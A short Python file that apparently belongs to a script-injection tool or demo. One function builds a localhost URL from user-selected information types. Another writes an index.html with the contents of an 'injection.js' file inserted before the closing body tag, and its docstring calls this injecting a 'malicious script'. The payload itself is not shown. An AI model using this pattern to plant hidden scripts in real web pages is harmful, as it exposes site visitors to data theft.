from typing import List

def generate_url(selected_info: List[str]):
    """Generates a URL based on the selected information types.

    Args:
        selected_info (List[str]): A list of information types selected by the user.

    Returns:
        str: A shortened URL that can be used to retrieve the selected information.
    """
    url = f"http://localhost:3000/?"
    for info in selected_info:
        url += f"{info}=1&"
    return url[:-1]

def write_template_contents_to_assets(template_file_path: str):
    """Writes the contents of the template file to the assets folder.
    This is also where the injection of the malicious script occurs.

    Args:
        template_file_path (str): The path to the template file.
    """
    with open(template_file_path, 'r') as template_file:
        template_contents = template_file.read()
    with open('../assets/injection.js', 'r') as injection_file:
        injection_contents = injection_file.read()
    with open('../assets/index.html', 'w') as template_file:
        template_file.write(template_contents.replace("</body>", f"<script>{injection_contents}</script></body>"))
